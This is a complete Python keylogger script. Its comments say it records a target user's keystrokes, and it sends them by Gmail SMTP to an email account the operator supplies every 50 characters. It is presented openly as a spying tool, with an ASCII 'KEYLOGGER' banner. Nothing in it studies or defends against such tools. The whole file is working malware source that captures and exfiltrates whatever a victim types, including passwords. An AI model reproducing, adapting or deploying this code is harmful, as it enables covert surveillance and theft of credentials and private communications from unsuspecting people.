#This program logs the keystrokes of the target user and
#sends them to an email you specify

import getpass
import smtplib

from pynput.keyboard import Key, Listener




print(''' .----------------. .----------------. .----------------.   .----------------. .----------------. .----------------. .----------------. .----------------. .--------. 
| .--------------. | .--------------. | .--------------. | | .--------------. | .--------------. | .--------------. | .--------------. | .--------------. | .--------------. |
| |  ___  ____   | | |  _________   | | |  ____  ____  | | | |   _____      | | |     ____     | | |    ______    | | |    ______    | | |  _________   | | |  _______     | |
| | |_  ||_  _|  | | | |_   ___  |  | | | |_  _||_  _| | | | |  |_   _|     | | |   .'    `.   | | |  .' ___  |   | | |  .' ___  |   | | | |_   ___  |  | | | |_   __ \    | |
| |   | |_/ /    | | |   | |_  \_|  | | |   \ \  / /   | | | |    | |       | | |  /  .--.  \  | | | / .'   \_|   | | | / .'   \_|   | | |   | |_  \_|  | | |   | |__) |   | |
| |   |  __'.    | | |   |  _|  _   | | |    \ \/ /    | | | |    | |   _   | | |  | |    | |  | | | | |    ____  | | | | |    ____  | | |   |  _|  _   | | |   |  __ /    | |
| |  _| |  \ \_  | | |  _| |___/ |  | | |    _|  |_    | | | |   _| |__/ |  | | |  \  `--'  /  | | | \ `.___]  _| | | | \ `.___]  _| | | |  _| |___/ |  | | |  _| |  \ \_  | |
| | |____||____| | | | |_________|  | | |   |______|   | | | |  |________|  | | |   `.____.'   | | |  `._____.'   | | |  `._____.'   | | | |_________|  | | | |____| |___| | |
| |              | | |              | | |              | | | |              | | |              | | |              | | |              | | |              | | |              | |
| '--------------' | '--------------' | '--------------' | | '--------------' | '--------------' | '--------------' | '--------------' | '--------------' | '--------------' |
 '----------------' '----------------' '----------------'   '----------------' '----------------' '----------------' '----------------' '----------------' '----------------'
 ''')

#get email to send keystrokes to
email = input("Enter email: ") #if you wanted to prompt the victim for whatever reason
password = getpass.getpass(prompt='Password: ', stream=None) #used to prompt for a password for the email account Python will be sending password to
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

#KeyLogger
full_log = ''
word = ''
email_char_limit = 50

def on_press(key):
    global word
    global full_log
    global email
    global email_char_limit

    if key == Key.space or key == Key.enter: 
        word += ' ' #adds a space to word when the user presses 'space'
        full_log += word #adds the newly completed word to the full_log
        word = ''   #resets word variable
        if len(full_log) >= email_char_limit:   #if the log is full (based on email_char_limit variable, send the log
            send_log() # method to send the full_log to the specified email
            full_log = '' #resets full log
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word[:-1]
        
#if key pressed is not one of the above, log the keystroke and add it to word variable
    else:
        char = f'{key}' #store keystroke in char variable
        char = char[1:-1] # remove quotes from char variable
        word += char # add key to word variable

    if  key == Key.esc:
        return False

def send_log():
    server.sendmail(
        email, #email to send to
        email, #email to send from
        full_log #keylog package to send
        )
    
with Listener( on_press=on_press ) as listener:
    listener.join()


        
